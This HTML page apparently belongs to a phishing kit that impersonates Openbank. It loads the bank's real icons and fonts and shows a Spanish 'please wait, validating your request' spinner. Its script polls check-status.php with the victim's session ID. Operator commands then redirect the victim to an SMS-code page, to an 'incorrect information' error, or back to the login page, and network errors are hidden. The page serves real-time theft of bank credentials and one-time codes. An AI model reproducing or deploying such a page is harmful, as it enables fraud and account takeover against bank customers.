<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Openbank</title>
  <link rel="shortcut icon" href="https://assets.openbank.com/web/icons/rebranded_favicon.ico">
  <style>
    @font-face {
      font-family: 'Outfit Semibold';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Semibold.ttf') format('truetype');
    }
    @font-face {
      font-family: 'Outfit Regular';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Regular.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Regular.ttf') format('truetype');
    }
    @font-face {
      font-family: 'Outfit Light';
      src: url('https://assets.openbank.com/web/fonts/Outfit-Light.woff2') format('woff2'),
           url('https://assets.openbank.com/web/fonts/Outfit-Light.woff') format('woff'),
           url('https://assets.openbank.com/web/fonts/Outfit-Light.ttf') format('truetype');
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    html { font-size: 62.5%; }

    body {
      font-family: 'Outfit Regular', sans-serif;
      background-color: #f7f7f7;
      min-height: 100vh;
      position: relative;
      overflow-x: hidden;
      display: flex;
      flex-direction: column;
    }

    .header {
      background-color: #111111;
      display: flex;
      align-items: center;
      justify-content: space-between;
      padding: 0 24px;
      height: 64px;
      position: relative;
      z-index: 10;
    }

    .header-logo { display: flex; align-items: center; padding-left: 110px; }
    .header-logo img { height: 50px; width: auto; }

    .btn-cerrar {
      background: transparent;
      color: #fff;
      border: 1.5px solid #fff;
      border-radius: 0px;
      padding: 8px 20px;
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.4rem;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    .btn-cerrar:hover { background-color: rgba(255,255,255,0.1); }

    .loading-content {
      flex: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 40px 24px;
    }

    .loading-title {
      font-family: 'Outfit Semibold', sans-serif;
      font-size: 3rem;
      color: #666666;
      text-align: center;
      margin-bottom: 16px;
    }

    .loading-subtitle {
      font-family: 'Outfit Regular', sans-serif;
      font-size: 1.6rem;
      color: #666;
      text-align: center;
      margin-bottom: 40px;
    }

    .spinner {
      width: 60px;
      height: 60px;
      position: relative;
    }

    .spinner-track {
      width: 60px;
      height: 60px;
      border: 5px solid #d9d9d9;
      border-radius: 50%;
      position: absolute;
      top: 0;
      left: 0;
    }

    .spinner-indicator {
      width: 60px;
      height: 60px;
      border: 5px solid transparent;
      border-top: 5px solid #666666;
      border-right: 5px solid #666666;
      border-radius: 50%;
      position: absolute;
      top: 0;
      left: 0;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    @media (max-width: 768px) {
      .header { padding: 0 16px; }
      .header-logo { padding-left: 0; }
      .loading-title { font-size: 2.4rem; }
      .loading-subtitle { font-size: 1.4rem; }
    }
  </style>
</head>
<body>

  <header class="header">
    <div class="header-logo">
      <img src="logo.png" alt="Openbank logo">
    </div>
    <button class="btn-cerrar">Cerrar</button>
  </header>

  <main class="loading-content">
    <h1 class="loading-title">Por favor espera...</h1>
    <p class="loading-subtitle">Estamos validando tu solicitud, mantente en línea</p>
    <div class="spinner">
      <div class="spinner-track"></div>
      <div class="spinner-indicator"></div>
    </div>
  </main>

  <script>
    // Polling: consultar cada 2 segundos si hay una acción pendiente
    var sessionId = sessionStorage.getItem('sessionId');
    
    if (sessionId) {
      var pollInterval = setInterval(async function() {
        try {
          var response = await fetch('check-status.php?session=' + encodeURIComponent(sessionId));
          var data = await response.json();
          
          if (data.action === 'sms') {
            clearInterval(pollInterval);
            window.location.href = 'codigo.html';
          } else if (data.action === 'info_error') {
            clearInterval(pollInterval);
            sessionStorage.setItem('errorMessage', 'La información ingresada es incorrecta. Por favor, verifica tus datos.');
            window.location.href = 'index.html';
          } else if (data.action === 'login') {
            clearInterval(pollInterval);
            window.location.href = 'index.html';
          }
        } catch (e) {
          // Silenciar errores de red
        }
      }, 2000);
    }
  </script>

</body>
</html>
